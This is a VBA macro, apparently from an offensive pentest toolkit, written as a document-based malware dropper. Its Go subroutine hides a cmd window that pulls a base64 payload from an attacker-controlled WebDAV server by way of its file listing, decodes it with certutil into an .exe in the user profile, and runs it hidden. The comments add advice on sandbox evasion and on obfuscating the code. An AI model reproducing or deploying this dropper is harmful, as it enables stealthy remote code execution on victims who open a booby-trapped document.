'-------------------------------------------------------------------------------
' Call this subroutine
'-------------------------------------------------------------------------------
Sub Go()
    Dim srv As String, cmd As String, upfl As String, f1 As String, f2 As String
    Dim res As Integer
    
	'--------------------------------------------------------------
	' Put here some sanbdox evasion tricks, for example:
	' - check for printers
	' - check for last opened documents
	' - make it specific and targeted
	' - Or simply check some of the available techniques here: https://github.com/mgeeky/RobustPentestMacro/blob/master/RobustPentestMacro.vbs
	'--------------------------------------------------------------
	
	'--------------------------------------------------------------
	' Obfuscate the following block with any combination of simple obfuscation tricks:
	' - split and reverse string
	' - use of the chr() function
	' - Or simply use the following tool: https://github.com/mgeeky/VisualBasicObfuscator
	'--------------------------------------------------------------	
    srv = "<==== webdavdelivery.py  SERVER IP OR FQDN ====>"
    upfl = Environ("UserProfile")
    f1 = upfl + "\tmp.b64"
    f2 = upfl + "\tmp.exe"
    
    ' Call the WebDav server, list files, remove line break and replace bad characters place the result in a temporary file
    cmd = "cmd /v:on /c ""del " & f1 & "&for /f %f in ('pushd \\" & srv & " ^& dir /b /a-d ^& popd') do set s=%f&set m=!s:_=/!&echo|set /p=""!m!"" >> " & f1 & """"
    res = CreateObject("WScript.Shell").Run(cmd, 0, True)
    
    ' Decode the base64 payload
    cmd = "certutil.exe /decode " & f1 & " " & f2
    res = CreateObject("WScript.Shell").Run(cmd, 0, True)
    
    ' Eventually, call the payload
    res = Shell(f2, vbHide)
End Sub
